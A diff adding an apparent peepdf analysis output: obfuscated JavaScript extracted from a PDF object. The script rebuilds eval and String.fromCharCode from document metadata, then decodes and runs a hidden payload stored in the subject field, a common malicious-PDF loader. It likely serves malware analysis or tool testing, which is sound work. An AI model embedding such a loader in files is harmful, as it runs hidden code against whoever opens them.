@@ -1,0 +1,34 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+s2='';
+v=producer;
+t='le';
+b='v';
+c='';
+a=c.concat('e','|','a',"n","b","w",b,"o");
+s=author+a[2]+t[0];
+e=v[v]()[s];
+dxxf=e(v[4]+'i'.concat(v[4],t));
+q=dxxf[v](a.length-7,a.length+1);
+d=v[0].toUpperCase()+'tring.f'+'r';
+d+='o'+q;
+ufgld=e(e('d'));
+sub=v[0];
+sub+='ubject';
+q=dxxf[e('v')](t.length+12)[v[0]+e(sub)+'t']('c');
+k=q[t[0].concat('eng'+'t'+'h')];
+i=t.length-2;
+for(;i!==k;){
+	oij = 1*(q[i]);
+	i++;
+	oij -= (-1)*(q[i]);
+	s2 += ufgld(oij);
+	i++;
+}
+e(s2);
+)
+>>]
+>>
+
